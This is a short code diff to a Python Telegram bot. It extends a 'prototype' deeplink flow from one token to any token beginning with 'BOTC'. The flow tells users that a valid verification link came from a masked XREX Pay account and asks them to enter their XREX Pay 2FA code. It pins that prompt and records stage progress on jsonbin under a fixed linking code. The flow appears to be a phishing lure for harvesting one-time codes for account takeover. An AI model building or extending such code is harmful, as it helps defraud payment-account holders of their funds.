@@ -227,8 +227,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         verify_token = context.args[0]
         logger.info(f"Deeplink accessed with verify token: {verify_token} by user {user_id}")
         
-        # Prototype flow: special handling for BOTC158
-        if verify_token == "BOTC158":
+        # Prototype flow: special handling for BOTC tokens (e.g., BOTC158, BOTC1583)
+        token_upper = str(verify_token).upper()
+        if token_upper.startswith("BOTC"):
             keyboard = [[
                 InlineKeyboardButton("📋 What is 2FA", callback_data="what_is_2fa"),
                 InlineKeyboardButton("...  More", callback_data="more")
@@ -236,7 +237,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 sent = await update.message.reply_text(
-                    "✅️ Valid unique verification link detected from XREX Pay account @AG***CH\n\n"
+                    "✅️ Valid unique verification link detected from XREX Pay account \"@AG***CH\"\n\n"
                     "Please enter your XREX Pay 2FA to proceed with linking your Telegram account to XREX Pay.",
                     reply_markup=reply_markup
                 )
@@ -257,9 +258,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await push_jsonbin_state(stage=3, twofa_verified=False, linking_code='NDG341F')
                 except Exception:
                     pass
-                logger.info(f"Sent and pinned BOTC158 linking prompt to user {user_id}")
+                logger.info(f"Sent and pinned BOTC linking prompt to user {user_id} for token {verify_token}")
             except Exception as e:
-                logger.error(f"Error sending BOTC158 message to user {user_id}: {str(e)}")
+                logger.error(f"Error sending BOTC message to user {user_id}: {str(e)}")
                 await update.message.reply_text(f"{user_name}, an error occurred. Please try again.")
             return
         
